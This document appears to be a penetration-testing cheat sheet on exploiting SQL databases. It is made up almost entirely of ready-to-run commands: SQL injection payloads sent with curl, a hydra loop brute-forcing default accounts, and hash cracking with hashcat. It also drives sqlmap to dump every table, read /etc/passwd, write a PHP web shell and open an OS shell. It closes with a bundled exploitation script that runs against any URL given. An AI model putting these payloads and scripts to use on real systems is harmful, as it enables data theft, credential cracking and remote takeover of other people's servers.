# Complete SQL Relational Database Exploitation Guide (New Content)

## 1. SQL Interaction - SQLite

**SQLite file extraction:**
```bash
# Download SQLite DB from web/app dir
wget http://192.168.1.100/app.db

# Browse structure
sqlite3 app.db ".schema"      # Shows table schemas
sqlite3 app.db ".tables"      # Lists all tables
sqlite3 app.db "PRAGMA table_info(users);"  # Column details
```

**Extract data:**
```bash
sqlite3 app.db "SELECT * FROM users LIMIT 10;"  # First 10 users
sqlite3 app.db "SELECT username,password FROM users;" > users.txt
sqlite3 app.db ".dump users" > users.sql  # Full table dump
```

## 2. Common Connection Strings Recognition

**JDBC connection strings:**
```
jdbc:mysql://192.168.1.100:3306/db?user=root&password=pass
jdbc:postgresql://192.168.1.100:5432/template1
jdbc:oracle:thin:@192.168.1.100:1521:XE
jdbc:sqlite:app.db
```

**ODBC connection strings:**
```
Driver={MySQL ODBC 8.0};Server=192.168.1.100;Database=db;Uid=root;Pwd=pass;
Driver={PostgreSQL ANSI};Server=192.168.1.100;Port=5432;Database=template1;
```

**Extract from web apps:**
```bash
grep -ri "jdbc\|odbc\|server=" /var/www/ --include="*.php" --include="*.jsp" --include="*.config"
curl http://192.168.1.100/config.php | grep -i "jdbc\|server"
```

## 3. Generic SQL Injection Exploitation

**Union-based extraction:**
```bash
curl "http://192.168.1.100/vuln.php?id=1' UNION SELECT 1,username,password FROM users--"
curl "http://192.168.1.100/vuln.php?id=-1 UNION SELECT table_name,NULL FROM information_schema.tables--"
```

**Error-based (MySQL):**
```bash
curl "http://192.168.1.100/vuln.php?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x717a6b7071,(SELECT database()),0x717a6b7071,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
```

**Blind boolean:**
```bash
sqlmap -u "http://192.168.1.100/vuln.php?id=1" --technique=B --threads=5
```

## 4. Default Account Enumeration (Generic)

**Common SQL defaults across DBs:**
```bash
# MSSQL
sqlcmd -S 192.168.1.100 -U sa -P ''

# All databases
for db in mysql postgres oracle mssql sqlite; do
    hydra -l root -p '' $db://192.168.1.100
done
```

**Connection string parsing:**
```bash
grep -r "sa;" /var/www/  # MSSQL sa password
grep -r "postgres\|template1" /var/www/  # PostgreSQL
```

## 5. Data Extraction Techniques

**Database names:**
```bash
# MySQL
curl "http://target/vuln.php?id=1' UNION SELECT schema_name,2 FROM information_schema.schemata--"

# PostgreSQL  
curl "http://target/vuln.php?id=1' UNION SELECT datname,2 FROM pg_database--"

# MSSQL
curl "http://target/vuln.php?id=1; SELECT name,2 FROM sys.databases--"
```

**Table/column names:**
```bash
# MySQL
curl "http://target/vuln.php?id=1' UNION SELECT table_name,column_name FROM information_schema.columns--"

# PostgreSQL
curl "http://target/vuln.php?id=1' UNION SELECT table_name,column_name FROM information_schema.columns--"
```

**Hash cracking:**
```bash
# Extracted MySQL hashes
mysql -u root -p -e "SELECT user,plugin,authentication_string FROM mysql.user;" | grep mysql_native_password
# $mysql_native_password$*00*... → hashcat -m 1421 mysql_hashes.txt rockyou.txt
```

## 6. SQLMap Automation

**Full database enum:**
```bash
sqlmap -u "http://192.168.1.100/vuln.php?id=1" \
--dbs --tables --columns --dump-all \
--batch --threads=5 --risk=3 --level=5
```

**File read:**
```bash
sqlmap -u "http://192.168.1.100/vuln.php?id=1" \
--file-read=/etc/passwd --batch
```

**OS command execution:**
```bash
sqlmap -u "http://192.168.1.100/vuln.php?id=1" \
--os-shell --batch  # Interactive shell
```

## 7. Multi-DB Universal Queries

**Database type fingerprint:**
```bash
curl "http://target/vuln.php?id=1' AND 1=1--"  # Works everywhere
curl "http://target/vuln.php?id=1' AND @@version-- "  # MySQL
curl "http://target/vuln.php?id=1' AND current_database()-- "  # PostgreSQL
curl "http://target/vuln.php?id=1; SELECT @@version-- "  # MSSQL
```

**Universal user extraction:**
```bash
sqlmap -u "http://target/vuln.php?id=1" \
--tables --columns --dump \
--dbms=mysql --batch  # Auto-detects DB type
```

## 8. Complete SQL Exploitation Framework

```bash
#!/bin/bash
# sql_exploit.sh
URL=$1

echo "[+] Universal SQL exploitation $URL"

# 1. Fingerprint + basics
sqlmap -u "$URL" --banner --current-db --is-dba --batch

# 2. Full enum
sqlmap -u "$URL" --dbs --tables --columns --dump-all --batch

# 3. File ops
sqlmap -u "$URL" --file-read=/etc/passwd --file-write=shell.php --batch

# 4. Shell
sqlmap -u "$URL" --os-shell --batch
```

**NEW CONTENT ONLY**: SQLite interaction, connection string recognition (JDBC/ODBC), generic SQLi (union/error/blind), sqlmap automation, universal queries, hash cracking from multiple DBs. No MySQL/PostgreSQL/Oracle duplication.